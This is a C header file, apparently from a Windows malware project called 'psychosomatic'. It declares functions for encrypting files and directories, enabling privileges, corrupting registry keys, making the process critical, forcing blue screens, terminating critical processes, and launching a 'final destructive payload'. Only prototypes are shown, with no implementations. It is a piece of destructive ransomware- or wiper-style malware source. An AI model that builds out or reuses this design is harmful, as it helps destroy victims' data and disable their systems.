#pragma once
#include "psychosomatic.h"

BOOL WINAPI PsCryptFile(LPCWSTR lpFilename);
ULONGLONG WINAPI PsCryptDirectory(LPCWSTR lpDirectory);
VOID WINAPI PsEncryptionMain(void);
typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
NTSTATUS RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
BOOL WINAPI PsEnablePrivileges(void);
VOID WINAPI PsDestructionMain(void);
VOID WINAPI LogonUICheck(void);
NTSTATUS NTAPI NtRaiseHardError(
	IN NTSTATUS ErrorStatus,
	IN ULONG NumberOfParameters,
	IN PUNICODE_STRING UnicodeStringParameterMask OPTIONAL,
	IN PVOID* Parameters,
	IN HARDERROR_RESPONSE_OPTION ResponseOption,
	OUT PVOID Response
);
BOOL PsCorruptKey(HKEY hLoc, LPCWSTR directory, LPCWSTR keyName);
BOOL PsCorruptValues(HKEY hLoc, LPCWSTR lpSubKey);
BOOL PsCorruptSubKeys(HKEY hLoc, LPCWSTR lpSubKey);
NTSTATUS RtlSetProcessIsCritical(BOOLEAN bNew, BOOLEAN* pbOld, BOOLEAN bNeedScb);
HANDLE WINAPI PsLaunchFinalDestructivePayload(void);
VOID WINAPI BSOD(DWORD stopcode);
NTSTATUS NTAPI NtSetInformationProcess(
	_In_ HANDLE ProcessHandle,
	_In_ INT ProcessInformationClass,
	_In_ PVOID ProcessInformation,
	_In_ ULONG ProcessInformationLength);
BOOL WINAPI LUITerminateCriticalProcess(LPCWSTR processName);